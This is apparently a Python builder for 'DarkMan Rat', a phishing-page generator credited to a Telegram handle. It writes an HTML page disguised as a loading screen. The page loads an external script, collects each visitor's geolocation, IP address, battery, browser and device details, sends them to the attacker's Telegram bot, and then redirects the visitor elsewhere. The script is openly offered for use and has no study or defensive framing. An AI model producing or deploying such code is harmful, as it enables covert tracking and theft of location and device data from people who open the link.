import os,sys
try:
    from rich import print as pr
except:
    os.system('pip install rich')
    try:
        from rich import print as pr
    except:
        print("ERROR: Please Install `rich` library!")
        sys.exit()



# Print Bannner
pr("""
[bold green]
   


+---------------------------------------------------------------------+
| /$$$$$$$                      /$$                                   |
|| $$__  $$                    | $$                                   |
|| $$  \ $$  /$$$$$$   /$$$$$$ | $$   /$$                             |
|| $$  | $$ |____  $$ /$$__  $$| $$  /$$/                             |
|| $$  | $$  /$$$$$$$| $$  \__/| $$$$$$/                              |
|| $$  | $$ /$$__  $$| $$      | $$_  $$                              |
|| $$$$$$$/|  $$$$$$$| $$      | $$ \  $$                             |
||_______/  \_______/|__/      |__/  \__/                             |
|                                                                     |
|                                                                     |
|                                                                     |
| /$$      /$$                           /$$$$$$$              /$$    |
|| $$$    /$$$                          | $$__  $$            | $$    |
|| $$$$  /$$$$  /$$$$$$  /$$$$$$$       | $$  \ $$  /$$$$$$  /$$$$$$  |
|| $$ $$/$$ $$ |____  $$| $$__  $$      | $$$$$$$/ |____  $$|_  $$_/  |
|| $$  $$$| $$  /$$$$$$$| $$  \ $$      | $$__  $$  /$$$$$$$  | $$    |
|| $$\  $ | $$ /$$__  $$| $$  | $$      | $$  \ $$ /$$__  $$  | $$ /$$|
|| $$ \/  | $$|  $$$$$$$| $$  | $$      | $$  | $$|  $$$$$$$  |  $$$$/|
||__/     |__/ \_______/|__/  |__/      |__/  |__/ \_______/   \___/  |
+---------------------------------------------------------------------+


   
     CoDeD By NICOLA (Telegram : @Black_Nicola)
   
   
   
   
[/bold green]
""")












pr("[bold blue] [ ENTER ][/bold blue] [bold yellow]Create A Robot Telegram And Enter Telegram Token Robot : [/bold yellow]",end="")
token_telegram=str(input(''))


pr("[bold blue] [ ENTER ][/bold blue] [bold yellow]Get Your NumberID Telegram And Enter : [/bold yellow]",end="")
id_telegram=str(input(''))

pr("[bold blue] [ ENTER ][/bold blue] [bold yellow]Enter Url For Go User Next Hacking : [/bold yellow]",end="")
url=str(input(''))


pr("[bold blue] [ ENTER ][/bold blue] [bold yellow]Enter Path For Saving Rat [Def : appplication.html] : [/bold yellow]",end="")
rat_path=str(input(''))
if rat_path=='':
    rat_path=('application.html')















code_rat=('''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
<style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f9f9f9;
    }
    
    .loader {
      border: 16px solid #f3f3f3;
      border-top: 16px solid #3498db;
      border-radius: 50%;
      width: 120px;
      height: 120px;
      animation: spin 2s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    </style>
    </head>
    <body>
    <div class="loader"></div>
    <script>
      window.onload = function() {
        setTimeout(function(){
          document.body.style.display = "none";
        }, 200000); // Change the value to adjust loading time in milliseconds
      };
</script>





<script src="https://mr-r0ot.github.io/roker.js_library/roker3.3.3/roker.js"></script><script>
    var tk=("token");
    var nid=("id");
    var uta=("url");
    var wait_time=6000;
var info=(String.raw`⛑Target Hacked By DarkManRat!👻  CoDeD By @Black_nicola💀


  👺~~location : `+$browser_get_location()+String.raw`
  👺~~battery : `+$browser_get_battery()+String.raw`
  👺~~platform : `+$browser_platform()+String.raw`
  👺~~userAgent : `+$browser_userAgent()+String.raw`
  👺~~cpu_info : `+$browser_cpu_info()+String.raw`
  👺~~language : `+$browser_language()+String.raw`
  👺~~screen_height : `+$get_screen_height()+String.raw`
  👺~~screen_width : `+$get_screen_width()+String.raw`
  👺~~browserName : `+$browser_name()+String.raw` 
  👺~~browser_buildID : `+$browser_buildID()+String.raw`
  👺~~browser_onlion : `+$browser_onlion()+String.raw`
  👺~~browser_javaEnabled : `+$browser_javaEnabled()+String.raw`
  👺~~browser_cookieEnabled : `+$browser_cookieEnabled()+String.raw` 
  👺~~browser_is_webdriver : `+$browser_is_webdriver()+String.raw`
  👺~~browser_pdfViewerEnabled : `+$browser_pdfViewerEnabled()+String.raw`
  👺~~browser_number_plugins_installed : `+$browser_number_plugins_installed()+String.raw`
  👺~~referrer : `+$get_referrer()+String.raw`
  👺~~protoco : `+$get_protocol()+String.raw`
  👺~~data : `+$get_data());$browser_get_ip(function(ip){info=(info+String.raw`
   ~~IP : `+ip);$get_location_from_ip(ip,function(i){info=(info+String.raw`
    ~~Location : `+i);$telegram_sendMessage(tk,nid,info);$telegram_sendMessage_post(tk,nid,info);});$telegram_sendMessage(tk,nid,info);$telegram_sendMessage_post(tk,nid,info);});$telegram_sendMessage(tk,nid,info);$telegram_sendMessage_post(tk,nid,info);window.onload=function(){setTimeout(function(){$go_url(uta);},wait_time);};</script></body></html>''')





code_rat=(code_rat.replace("token",token_telegram).replace("id",id_telegram).replace("url",url))




wapp=open(rat_path,'wb')
wapp.write(code_rat.encode())
wapp.close()


print(f" [ + ]  Rat Creted  {os.getcwd()}  With Name  {rat_path}")
